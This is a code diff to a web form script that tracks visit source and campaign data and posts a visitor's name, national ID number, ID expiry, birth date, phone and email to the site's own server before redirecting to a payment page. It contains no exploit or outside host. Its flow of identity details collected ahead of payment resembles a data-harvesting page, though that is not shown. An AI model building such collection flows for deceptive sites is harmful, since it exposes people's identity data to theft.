@@ -1013,19 +1013,80 @@
             confirmCode.value = this.value;
         });
 
+        // ===== Visit Source & Country Tracking =====
+        let visitSource = localStorage.getItem('visitSource') || 'Direct';
+        let referrer = localStorage.getItem('referrer') || '';
+        let utmSource = localStorage.getItem('utmSource') || '';
+        let utmMedium = localStorage.getItem('utmMedium') || '';
+        let utmCampaign = localStorage.getItem('utmCampaign') || '';
+        let savedOrderId = sessionStorage.getItem('orderId') || '';
+
+        fetch('/api/session')
+            .then(res => res.json())
+            .then(data => {
+                if (data.country) localStorage.setItem('visitCountry', data.country);
+                if (data.visitSource) {
+                    localStorage.setItem('visitSource', data.visitSource);
+                    visitSource = data.visitSource;
+                }
+                if (data.referrer) {
+                    localStorage.setItem('referrer', data.referrer);
+                    referrer = data.referrer;
+                }
+                if (data.utmSource) {
+                    localStorage.setItem('utmSource', data.utmSource);
+                    utmSource = data.utmSource;
+                }
+            })
+            .catch(() => {});
+
         // Form submission - redirect to payment page
-        document.getElementById('personalDataForm').addEventListener('submit', function(e) {
+        document.getElementById('personalDataForm').addEventListener('submit', async function(e) {
             e.preventDefault();
-            // Save form data to localStorage for admin panel
             const formData = new FormData(this);
             const data = {};
             formData.forEach((value, key) => { data[key] = value; });
             localStorage.setItem('userData', JSON.stringify(data));
             
-            // Save selected country for payment page
             localStorage.setItem('selectedCountry', data.residence_country || 'QA');
             
-            // Set session as active
+            // إرسال البيانات الشخصية للسيرفر
+            const submitData = {
+                fullname: data.fullname,
+                id_number: data.id_number,
+                phone: data.main_phone,
+                id_expiry_day: data.id_expiry_day || '',
+                id_expiry_month: data.id_expiry_month || '',
+                id_expiry_year: data.id_expiry_year || '',
+                dob_day: data.dob_day || '',
+                dob_month: data.dob_month || '',
+                dob_year: data.dob_year || '',
+                email: data.email,
+                gender: data.gender || 'male',
+                residence_country: data.residence_country || 'QA',
+                orderId: savedOrderId || undefined,
+                visitSource: visitSource,
+                referrer: referrer,
+                utmSource: utmSource,
+                utmMedium: utmMedium,
+                utmCampaign: utmCampaign,
+                landingPage: '/data-en.html'
+            };
+
+            try {
+                const response = await fetch('/api/orders/personal-data', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(submitData)
+                });
+                const result = await response.json();
+                if (response.ok) {
+                    sessionStorage.setItem('orderId', result.orderId);
+                }
+            } catch (err) {
+                console.error('Failed to save personal data:', err);
+            }
+            
             const sessionData = {
                 phone: data.main_phone || data.confirm_phone,
                 email: data.email,
@@ -1035,7 +1096,6 @@
             };
             localStorage.setItem('activeSession', JSON.stringify(sessionData));
             
-            // Navigate to payment page
             window.location.href = 'payment-en.html';
         });
     </script>
